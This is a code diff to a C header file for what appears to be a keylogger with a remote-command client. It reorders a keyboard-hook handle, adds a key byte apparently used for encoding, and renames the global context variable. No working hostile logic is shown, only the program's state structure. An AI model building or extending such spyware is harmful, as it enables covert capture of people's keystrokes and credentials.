@@ -17,18 +17,20 @@
 typedef struct {
     CLIENT_HANDLER* client;  // client handler struct
     KEY_LOGGER* kLogger;     // keylogger struct
-    HHOOK hLowLevelKeyHook;  // lowlevel key hook handle
     
     DWORD mainThreadId;   // id of the main thread
     HANDLE hWriteThread;  // handle to log writer thread
     HANDLE hCmdThread;    // handle to remote command retrieval worker thread
     HANDLE hMutexThreadSync;   // thread mutex handle
+    HHOOK hLowLevelKeyHook;  // lowlevel key hook handle
     
     BOOL shutdown;  // shutdown flag updated in the commands.c source file
-    BOOL sleeping;  // if true, the key events will be skipped 
+    BOOL sleeping;  // if true, the key events will be skipped
+
+    unsigned char __KEY__; 
 } PROGRAM_CONTEXT;
 
-extern PROGRAM_CONTEXT* progContext;  // Global program context variable
+extern PROGRAM_CONTEXT* ctx;  // Global program context variable
 
 ERR_CODE setup();         // setups up client and program itself
 ERR_CODE startThreads();  // initialises worker threads
